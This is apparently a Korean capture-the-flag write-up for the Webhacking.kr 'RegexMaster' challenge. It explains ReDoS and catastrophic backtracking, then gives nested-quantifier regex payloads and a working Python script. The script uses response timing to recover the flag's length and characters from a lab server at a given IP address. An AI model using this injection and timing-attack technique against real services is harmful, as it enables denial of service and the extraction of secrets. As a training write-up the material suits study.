---
title: ["[Webhacking.kr] RegexMaster (xss - 300)"]
date: 2025-01-10 09:00:00 +0900
categories: [writeup, webhacking.kr]
tags: [web, xss]
---

```php
<?php
  include "./config.php";
  $result = preg_match("/{$_GET['pattern']}/", $flag);
  //echo $result; // sorry ;)
  highlight_file(__FILE__);
?>
```

정규표현식을 이용해 flag를 추정하는 문제이다.  
별다른 출력값이 없어서 딜레이를 이용한 time based로 접근하면 될 것 같다.  

관련해서 구글링해보니, ReDoS(Regular Expression Denial of Service)와 Catastrophic Bactracking과 관련된 개념이 나왔다.  

먼저 ReDoS는 정규표현식의 백트래킹으로 인한 성능 저하를 이용한 공격으로, 특정 패턴에서 매칭 시도가 기하급수적으로 증가하는 현상을 이용해 서버에 딜레이를 일으키는 DoS 공격의 일종이었다.  
아마 문제 서버가 한동안 내려간 이유가 누군가 이 공격을 하지 않았을까 추정해본다.  

문제를 풀기 위해선 Catastrophic Backtracking 개념을 이용해야되는데,  
중첩된 수량자(예: `(a*)*`), 겹치는 패턴을 이용해서 매칭의 시간 복잡도를 지수적으로 증가시켜 딜레이를 발생시키는 개념이다.  

로컬에 간단히 서버를 구축하고 테스트 해본 결과,  
`(((((((((((((((((((.*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)` 이정도의 백트래킹 구문을 사용해야 2초 정도의 딜레이가 발생함을 알 수 있었다.  

flag가 `FLAG{}` 형태임을 이용해서 페이로드를 구성해 보면
```
# 1. 백트래킹을 일으키는 패턴
((((((((((.*)*)*)*)*)*)*)*)*)*)

# 2. 길이 체크: FLAG{ 뒤로 남은 길이는 25
^FLAG{((((((((((.*)*)*)*)*)*)*)*)*)*).{i}$

# 3. 문자 체크
^FLAG{test_char((((((((((.*)*)*)*)*)*)*)*)*)*).{remaining_len}$
```

최종 페이로드는 다음과 같다.
flag 중간에 정규표현식에서 의미를 가지는 특수문자가 포함되어, 백슬래시로 이스케이프 처리 해주는게 관건이었다.  
```python
import requests
import time
import string

url = 'http://218.145.226.8:20001'
pattern = '(((((((((((((((((((.*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*).{'
flag_len = 0
flag = '^FLAG{'


for i in range(1,50):
    start = time.time()
    response = requests.get(f'{url}?pattern={flag}{pattern}{i}'+'}$')
    end = time.time()

    if end-start < 1:
        flag_len = i - 1
        print(flag_len)
        break

for i in range(flag_len-1):    
    for c in string.punctuation + string.ascii_letters + string.digits:
        if c in string.punctuation:
            c = '\\' + c
        start = time.time()
        response = requests.get(f'{url}?pattern={flag}{c}{pattern}{flag_len-i-1}'+'}$')
        end = time.time()

        if end-start > 2:
            flag += c
            print(flag)
            break
    else:
        print("nono")

flag += '}'
flag = flag.replace('^', '')
flag = flag.replace('\\', '')

print(flag)
```